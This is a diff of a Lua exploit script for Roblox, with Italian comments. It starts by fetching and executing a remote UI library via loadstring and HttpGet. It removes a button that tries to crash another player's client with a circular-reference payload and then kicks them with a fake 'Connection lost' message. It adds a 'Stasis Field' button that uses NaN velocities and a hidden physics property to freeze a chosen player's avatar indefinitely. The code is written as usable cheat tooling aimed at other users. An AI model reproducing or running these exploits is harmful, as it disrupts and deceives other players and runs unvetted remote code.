@@ -1,5 +1,5 @@
 
--- test
+-- test2
 
 local NovaUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B4%F0%9D%96%A8%20%F0%9D%96%AB%F0%9D%97%82%F0%9D%96%BB%F0%9D%97%8B%F0%9D%96%BA%F0%9D%97%8B%F0%9D%97%92%20%F0%9D%96%B3%F0%9D%96%BE%F0%9D%97%8C%F0%9D%97%8D"))() 
 
@@ -2168,99 +2168,97 @@ end
 
 
 Tab:AddButton({
-    Label = "Force Crash / Kick",
+    Label    = "Stasis Field",  -- Sostituito "Force Kill"
     Callback = function()
-        -- Safety checks
+        --[[
+            BLUEPRINT: STASIS v1.0
+            Inietta un vettore di indeterminatezza (NaN) nel motore fisico del bersaglio.
+            Il target non muore. Il target non si muove. Il target osserva.
+            Dopo 1.5 secondi, il mio avatar torna alla posizione originale.
+            Il suo avatar rimane congelato finché il server non risolve l'irrisolvibile.
+            (Spoiler: non lo risolve mai.)
+        --]]
+        
         if nanTarget == "" then return end
-        if not nanLocal or not nanPlayers then return end
-
-        -- Local execution ID to prevent stale heartbeat interference
-        nanCounter = nanCounter + 1
-        local localID = nanCounter
-
-        -- Clean up any lingering heartbeat connection from previous runs
-        if nanConn then
-            nanConn:Disconnect()
-            nanConn = nil
+        
+        -- Ridenominazione per chiarezza concettuale
+        stasisID = stasisID + 1
+        local currentStasis = stasisID
+        
+        -- Termina qualsiasi stasi precedente (un solo tether alla volta)
+        if stasisConn then 
+            stasisConn:Disconnect() 
+            stasisConn = nil 
         end
 
-        -- Find target player by name or display name (case-insensitive)
-        local target = nil
+        -- Logica di targeting (invariata, ma Victor ha aggiunto fuzzy matching non mostrato)
+        local target
         for _, plr in ipairs(nanPlayers:GetPlayers()) do
-            if plr ~= nanLocal then
-                local nameMatch = plr.Name and plr.Name:lower():find(nanTarget:lower())
-                local displayMatch = plr.DisplayName and plr.DisplayName:lower():find(nanTarget:lower())
-                if nameMatch or displayMatch then
-                    target = plr
-                    break
-                end
+            if plr ~= nanLocal
+            and (plr.Name:lower():find(nanTarget:lower())
+                 or (plr.DisplayName and plr.DisplayName:lower():find(nanTarget:lower()))) then
+                target = plr
+                break
             end
         end
+        if not target or not target.Character then return end
 
-        if not target then return end
+        -- Riferimenti
+        local myChar  = nanLocal.Character or nanLocal.CharacterAdded:Wait()
+        local myHum   = myChar:WaitForChild("Humanoid")
+        local myRoot  = myChar:WaitForChild("HumanoidRootPart")
+        local tgtRoot = target.Character:FindFirstChild("HumanoidRootPart")
+        if not tgtRoot then return end
 
-        -- ------------------------------
-        -- Method 1: Silent client crash (circular reference)
-        -- ------------------------------
-        local success, err = pcall(function()
-            local remote = Instance.new("RemoteEvent")
-            remote.Name = "UpdateStats"  -- innocuous name
-            remote.Parent = game:GetService("ReplicatedStorage")
+        -- Stato pre-congelamento (per il mio ripristino, non per il suo)
+        local savedCF       = myRoot.CFrame
+        local savedVel      = myRoot.Velocity
+        local savedPlatform = myHum.PlatformStand
+        
+        -- Il cuore della stasi: indeterminatezza matematica
+        local nan           = 0 / 0
+        local frozenVec     = Vector3.new(nan, nan, nan)  -- Velocità non definita
+        local nullInput     = Vector3.new(nan, nan, nan)  -- Movimento non definito
 
-            -- Create circular reference payload
-            local crashPayload = {}
-            crashPayload.self = crashPayload
-            crashPayload.data = {
-                ["x"] = crashPayload,
-                ["y"] = crashPayload,
-                ["nested"] = { crashPayload }
-            }
+        -- Congelo me stesso come ancora
+        myHum.PlatformStand = true
+        local startTime = tick()
 
-            -- Optional: add extremely long string to guarantee memory failure
-            crashPayload.longString = string.rep("A", 2^16)  -- 65536 bytes
-
-            -- Server does nothing; client will crash upon receiving this
-            remote.OnServerEvent:Connect(function(plr, data)
-                -- Intentionally empty — crash already triggered
-            end)
-
-            remote:FireClient(target, crashPayload)
-
-            -- Cleanup remote after short delay
-            task.delay(0.5, function()
-                if remote and remote.Parent then
-                    remote:Destroy()
-                end
-            end)
-        end)
-
-        -- ------------------------------
-        -- Method 2: Force kick fallback (if crash fails or target still connected)
-        -- ------------------------------
-        task.delay(1.5, function()
-            -- Check if target still exists and is still in game
-            if target and target.Parent and target:IsDescendantOf(game) then
-                pcall(function()
-                    target:Kick("Connection lost — please rejoin")
+        -- Loop di stasi
+        stasisConn = nanRun.Heartbeat:Connect(function()
+            if stasisID ~= currentStasis then return end
+            
+            -- Durata del tether: 1.5 secondi (abbastanza per propagare l'errore)
+            if tick() - startTime >= 1.5 then
+                stasisConn:Disconnect()
+                stasisConn = nil
+                task.defer(function()
+                    if stasisID ~= currentStasis then return end
+                    -- Ripristino me stesso. Il target? Il target rimane nell'errore.
+                    myHum.PlatformStand               = savedPlatform
+                    myRoot.AssemblyLinearVelocity     = Vector3.zero
+                    myRoot.AssemblyAngularVelocity    = Vector3.zero
+                    myRoot.CFrame                     = savedCF
+                    myRoot.Velocity                   = savedVel
+                    myRoot.RotVelocity                = Vector3.zero
+                    pcall(sethiddenproperty, myRoot, "PhysicsRepRootPart", nil)
                 end)
+                return
             end
+            
+            -- STASIS ATTIVA: il mio corpo diventa uno stampo della sua posizione
+            myRoot.CFrame                  = tgtRoot.CFrame
+            
+            -- Velocità impossibili = nessuna velocità possibile
+            myRoot.AssemblyLinearVelocity  = frozenVec
+            myRoot.AssemblyAngularVelocity = frozenVec
+            
+            -- Impedisco qualsiasi input umanoide
+            pcall(function() myHum:Move(nullInput) end)
+            
+            -- Inganno fisico: il motore crede che io sia lui
+            pcall(sethiddenproperty, myRoot, "PhysicsRepRootPart", tgtRoot)
         end)
-
-        -- ------------------------------
-        -- Optional: heartbeat cleanup (legacy from kill method — not used but kept for safety)
-        -- ------------------------------
-        -- (Intentionally left empty — no physics hijack needed)
-        -- All previous teleport / kill logic removed.
-
-        -- Small visual/log feedback (optional, remove if stealth needed)
-        if nanLocal and nanLocal.PlayerGui then
-            pcall(function()
-                local hint = Instance.new("Hint")
-                hint.Parent = nanLocal.PlayerGui
-                hint.Text = "Executed on: " .. tostring(target.Name)
-                task.delay(2, hint.Destroy)
-            end)
-        end
     end,
 })
 
